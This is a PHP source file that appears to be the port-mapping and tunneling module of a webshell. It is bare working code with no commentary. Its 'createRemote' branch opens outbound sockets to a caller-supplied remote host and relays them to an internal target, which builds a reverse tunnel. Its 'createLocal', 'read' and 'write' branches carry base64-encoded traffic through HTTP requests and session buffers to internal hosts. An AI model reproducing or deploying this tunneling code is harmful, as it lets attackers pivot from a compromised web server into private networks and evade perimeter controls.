@error_reporting(0);
function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remoteIP = "", $remotePort = "", $extraData = "")
{
    switch ($action) {
        case "createRemote":
            set_time_limit(0);
            //fastcgi_finish_request();
            @session_start();
            $_SESSION["remoteRunning"] = true;
            session_write_close();
            global $read, $outers, $targets;
            $ready = false;
            $outers = array();
            $targets = array();
            $read = array();
            $write = array();
            $exp = array();

            $read = array_merge($targets, $outers);
            $init = true;
            while ($_SESSION["remoteRunning"]) {

                if ($ready == false) {

                    $outterSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                    //socket_set_nonblock($outterSocket);
                    $res = socket_connect($outterSocket, $remoteIP, intval($remotePort));
                    if (!$res) {
                        //file_put_contents("c:\\windows\\temp\\4.txt", "Error Creating Socket: " . socket_strerror(socket_last_error()));
                    }
                    socket_getsockname($outterSocket, $address, $port);
                    $outers[$port] = $outterSocket;

                    $outterSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                    //socket_set_nonblock($outterSocket);
                    $res = socket_connect($outterSocket, $remoteIP, intval($remotePort));
                    if (!$res) {
                        //file_put_contents("c:\\windows\\temp\\4.txt", "Error Creating Socket: " . socket_strerror(socket_last_error()));
                    }
                    socket_getsockname($outterSocket, $address, $port);
                    $outers[$port] = $outterSocket;
                    /*$targetSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                    //socket_set_nonblock($targetSocket);
                    $res = socket_connect($targetSocket, $targetIP, intval($targetPort));
                    if (!$res) {
                        //file_put_contents("c:\\windows\\temp\\4.txt", "Error Creating Socket: " . socket_strerror(socket_last_error()));
                    }
                    $targets[$port] = $targetSocket;
                    if ($init) {
                        $outterSocket_2 = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                        //socket_set_nonblock($outterSocket_2);
                        $res = socket_connect($outterSocket_2, $remoteIP, intval($remotePort));
                        socket_getsockname($outterSocket_2, $address, $port);
                        if (!$res) {
                            //file_put_contents("c:\\windows\\temp\\4.txt", "Error Creating Socket: " . socket_strerror(socket_last_error()));
                        }
                        $outers[$port] = $outterSocket_2;


                        $targetSocket_2 = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                        //socket_set_nonblock($targetSocket_2);
                        $res = socket_connect($targetSocket_2, $targetIP, intval($targetPort));
                        if (!$res) {
                            //file_put_contents("c:\\windows\\temp\\4.txt", "Error Creating Socket: " . socket_strerror(socket_last_error()));
                        }
                        $targets[$port] = $targetSocket_2;
                    }

                    $init = false;*/
                    $ready = true;

                }
                $read = array();
                $read = array_merge($targets, $outers);
                if (socket_select($read, $write, $exp, 0) > 0) {

                    foreach ($read as $socket_item) {
                        if (in_array($socket_item, $outers)) {

                            socket_getsockname($socket_item, $address, $key);
                            if (isset($targets[$key])) {
                                $content = socket_read($socket_item, 204800);
                                if (strlen($content) > 0) {
                                    socket_write($targets[$key], $content, strlen($content));
                                } else {
                                    $ready = false;
                                    socket_close($socket_item);
                                    socket_close($targets[$key]);
                                    unset($outers[$key]);
                                    unset($targets[$key]);
                                    continue;
                                }
                            } else {
                                $targetSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
                                //socket_set_nonblock($targetSocket);
                                $res = socket_connect($targetSocket, $targetIP, intval($targetPort));
                                if (!$res) {
                                    //file_put_contents("c:\\windows\\temp\\4.txt", "Error Creating Socket: " . socket_strerror(socket_last_error()));
                                }
                                $targets[$key] = $targetSocket;
                                $content = socket_read($socket_item, 204800);
                                if (strlen($content) > 0) {
                                    socket_write($targetSocket, $content, strlen($content));
                                } else {
                                    $ready = false;
                                    socket_close($socket_item);
                                    socket_close($targetSocket);
                                    unset($outers[$key]);
                                    unset($targets[$key]);
                                    continue;
                                }
                                continue;
                            }
                        }
                        if (in_array($socket_item, $targets)) {

                            foreach ($targets as $k => $v) {
                                if ($socket_item == $v) {
                                    if (isset($outers[$k])) {
                                        $content = socket_read($socket_item, 204800);

                                        if (strlen($content) > 0) {
                                            socket_write($outers[$k], $content, strlen($content));
                                        } else {

                                            /*$ready = false;
                                            socket_close($socket_item);
                                            socket_close($outers[$k]);
                                            unset($targets[$k]);
                                            unset($outers[$k]);*/
                                            continue;
                                        }
                                    } else {


                                        socket_close($socket_item);
                                        unset($targets[$k]);
                                        $ready = false;
                                        continue;
                                    }


                                    /*$content = socket_read($socket_item, 2048);
                                    if (strlen($content)==0)
                                    {
                                        unset($targets[$k]);
                                        continue;
                                    }
                                    socket_write($outers[$k], $content, strlen($content));*/
                                }
                            }
                        }
                    }
                }

                // 当select没有监听到可操作fd的时候，直接continue进入下一次循环
                else {
                    continue;
                }
            }
            break;
        case "createLocal":
            $localSocket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            if ($localSocket === false) {
                echo "\x37\x21\x49\x36Failed creating socket";
                return;
            }
            $res = @socket_connect($localSocket, $targetIP, $targetPort);
            if ($res === false) {
                echo "\x37\x21\x49\x36Failed connecting to target" . $targetIP . ":" . $targetPort;
                return;
            }
            socket_set_nonblock($localSocket);
            @session_start();
            $_SESSION["local_running".$socketHash] = true;
            $_SESSION["writebuf".$socketHash] = "";
            $_SESSION["readbuf".$socketHash] = "";
            session_write_close();
            ob_end_clean();
            header("Connection: close");
            ignore_user_abort();
            ob_start();
            $size = ob_get_length();
            header("Content-Length: $size");
            ob_end_flush();
            flush();

            while ($_SESSION["local_running".$socketHash]) {
                $readBuff = "";
                @session_start();
                $_SESSION["localPortMapLock".$socketHash] = "true";
                $writeBuff = $_SESSION["writebuf".$socketHash];
                $_SESSION["writebuf".$socketHash] = "";
                $_SESSION["localPortMapLock".$socketHash] = "false";
                session_write_close();
                if ($writeBuff != "") {
                    $i = socket_write($localSocket, $writeBuff, strlen($writeBuff));
                    if ($i === false) {
                        @session_start();
                        $_SESSION["local_running".$socketHash] = false;
                        session_write_close();
                        echo "\x37\x21\x49\x36Failed writing socket";
                    }
                }
                while ($o = socket_read($localSocket, 20480)) {
                    if ($o === false) {
                        @session_start();
                        $_SESSION["local_running".$socketHash] = false;
                        session_write_close();
                        echo "\x37\x21\x49\x36Failed reading from socket";
                    }
                    $readBuff .= $o;
                }
                if ($readBuff != "") {
                    @session_start();
                    $_SESSION["readbuf".$socketHash] .= $readBuff;
                    session_write_close();
                }
                #sleep(0.2);
            }
            socket_close($localSocket);
            break;
        case "read":

            @session_start();
            $readBuffer = $_SESSION["readbuf".$socketHash];
            $_SESSION["readbuf".$socketHash] = "";
            $running = $_SESSION["local_running".$socketHash];
            session_write_close();

            if (isset($_SESSION["local_running".$socketHash]))
            {
                if ($running) {
                            header("Connection: Keep-Alive");
                            echo $readBuffer;
                            return;
                        } else if ($running===false){
                            echo "\x37\x21\x49\x36RemoteSocket read filed";
                            return;
                        }
            }

            break;
        case "write": {
        //header('Content-Type: application/octet-stream');
                                $rawPostData = base64_decode($extraData);
                                if ($rawPostData) {

                                 while(true)
                                 {
                                 //sleep(1);
                                 @session_start();
                                 session_write_close();
                                  if ($_SESSION["localPortMapLock".$socketHash]==="false")
                                  {
                                     @session_start();
                                      $_SESSION["writebuf".$socketHash] .= $rawPostData;
                                      session_write_close();
                                      break;
                                  }
                                 }

                                    header("Connection: Keep-Alive");
                                    return;
                                } else {
                                    echo "\x37\x21\x49\x36POST request read filed";
                                }
                /*@session_start();
                $running = $_SESSION["local_running".$socketHash];
                session_write_close();
                file_put_contents("status.txt", "write startd before runig" . "\n", FILE_APPEND);
                if (isset($_SESSION["local_running".$socketHash]))
                {
                                if (!$running) {
                                    echo "\x37\x21\x49\x36No more running, close now";
                                    return;
                                }
                                header('Content-Type: application/octet-stream');
                                $rawPostData = base64_decode($extraData);
                                file_put_contents("status.txt", "write to: " . $extraData . "\n", FILE_APPEND);
                                if ($rawPostData) {
                                    @session_start();
                                    $_SESSION["writebuf".$socketHash] .= $rawPostData;
                                    session_write_close();
                                    header("Connection: Keep-Alive");
                                    return;
                                } else {
                                    echo "\x37\x21\x49\x36POST request read filed";
                                }

                }*/

            }
            break;
        case "closeLocal":
            @session_start();
            $running = $_SESSION["local_running"] = false;
            session_write_close();
            break;
        case "closeLocalWorker":
            @session_start();
            $running = $_SESSION["local_running".$socketHash] = false;
            session_write_close();
            break;

        case "closeRemote":
            @session_start();
            $_SESSION["remoteRunning"] = false;
            session_write_close();
            break;
    }
}
